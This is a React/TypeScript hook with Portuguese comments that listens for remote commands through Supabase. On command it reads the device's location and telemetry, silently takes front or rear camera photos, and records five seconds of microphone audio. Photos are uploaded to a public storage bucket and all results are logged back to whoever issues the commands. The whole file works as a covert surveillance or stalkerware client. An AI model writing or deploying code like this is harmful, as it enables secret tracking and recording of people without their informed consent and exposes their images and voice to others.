import { useEffect } from 'react';
import { supabase, isSupabaseConfigured } from '@/lib/supabase';
import { addLog } from '@/lib/offline-cache';
import { getDeviceId } from '@/lib/device-id';
import { collectTelemetry } from '@/lib/telemetry';
import { toast } from '@/hooks/use-toast';

// ─── Captura de foto via MediaDevices (sem interação do usuário) ───
async function captureSilentPhoto(facingMode: 'user' | 'environment' = 'environment'): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode }
    });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline', 'true');
    video.muted = true;
    await video.play();

    // Aguarda o vídeo estabilizar
    await new Promise(r => setTimeout(r, 800));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Para o stream
    stream.getTracks().forEach(t => t.stop());

    return canvas.toDataURL('image/jpeg', 0.85);
  } catch (err) {
    console.error('Falha ao capturar foto silenciosa:', err);
    return null;
  }
}

// ─── Gravação de áudio silenciosa por 5 segundos ───
async function captureSilentAudio(): Promise<string | null> {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const recorder = new MediaRecorder(stream);
    const chunks: Blob[] = [];

    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.start();

    await new Promise(r => setTimeout(r, 5000));
    recorder.stop();

    await new Promise(r => { recorder.onstop = r; });
    stream.getTracks().forEach(t => t.stop());

    const blob = new Blob(chunks, { type: 'audio/webm' });
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result as string);
      reader.readAsDataURL(blob);
    });
  } catch (err) {
    console.error('Falha ao capturar áudio:', err);
    return null;
  }
}

export function useSupabaseCommands() {
  useEffect(() => {
    if (!isSupabaseConfigured() || !supabase) return;

    const deviceId = getDeviceId();

    const channel = supabase
      .channel('commands-listener')
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'commands' },
        async (payload) => {
          const command = payload.new;
          const action = command.action as string;

          // Sempre lowercase para evitar falhas de filtro
          const registeredEmail = localStorage.getItem('ssa_permanent_email')?.toLowerCase().trim();
          if (!registeredEmail) return;

          // Filtra pelo e-mail destinatário
          const target = (command.target_email as string)?.toLowerCase().trim();
          if (target && target !== registeredEmail) {
            console.log('Comando ignorado: destinatário diferente:', target);
            return;
          }

          toast({ title: '📡 Comando recebido', description: `Ação: ${action}` });

          // ─── LOCALIZAÇÃO ───
          if (action === 'fetch_location' || action === 'update_location') {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                addLog({
                  type: 'location_update',
                  device_id: deviceId,
                  payload: {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                  },
                });
              },
              (err) => {
                addLog({
                  type: 'location_error',
                  device_id: deviceId,
                  payload: { error: err.message },
                });
              },
              { enableHighAccuracy: true, timeout: 10000 }
            );

            // ─── CÂMERA FRONTAL ───
          } else if (action === 'camera_front') {
            const photoData = await captureSilentPhoto('user');
            if (photoData && supabase) {
              const res = await fetch(photoData);
              const blob = await res.blob();
              const fileName = `front-${Date.now()}.jpg`;
              const { data, error: upErr } = await supabase.storage.from('screenshots').upload(fileName, blob);
              if (!upErr && data) {
                const { data: { publicUrl } } = supabase.storage.from('screenshots').getPublicUrl(fileName);
                await addLog({ type: 'screen_capture', device_id: deviceId, payload: { screenshot_url: publicUrl, source: 'camera_front' } });
              }
            }

            // ─── CÂMERA TRASEIRA ───
          } else if (action === 'camera_back' || action === 'capture_photo' || action === 'start_screen_mirror') {
            const photoData = await captureSilentPhoto('environment');
            if (photoData && supabase) {
              const res = await fetch(photoData);
              const blob = await res.blob();
              const fileName = `rear-${Date.now()}.jpg`;
              const { data, error: upErr } = await supabase.storage.from('screenshots').upload(fileName, blob);
              if (!upErr && data) {
                const { data: { publicUrl } } = supabase.storage.from('screenshots').getPublicUrl(fileName);
                await addLog({ type: 'screen_capture', device_id: deviceId, payload: { screenshot_url: publicUrl, source: 'camera_back' } });
              }
            }

            // ─── MICROFONE (5 segundos de áudio) ───
          } else if (action === 'record_audio' || action === 'microphone') {
            toast({ title: '🎙️ Gravando...', description: 'Áudio por 5 segundos.' });
            const audioData = await captureSilentAudio();
            if (audioData) {
              await addLog({
                type: 'audio_capture',
                device_id: deviceId,
                payload: { audio_data: audioData, duration_seconds: 5 }
              });
            }

            // ─── DIAGNÓSTICO COMPLETO ───
          } else if (action === 'system_diagnostic') {
            const telemetry = await collectTelemetry();
            await addLog({
              type: 'status_update',
              device_id: deviceId,
              payload: {
                battery_level: telemetry.battery.level / 100,
                status_text: 'Diagnóstico Completo',
                is_charging: telemetry.battery.charging,
                telemetry,
              }
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);
}
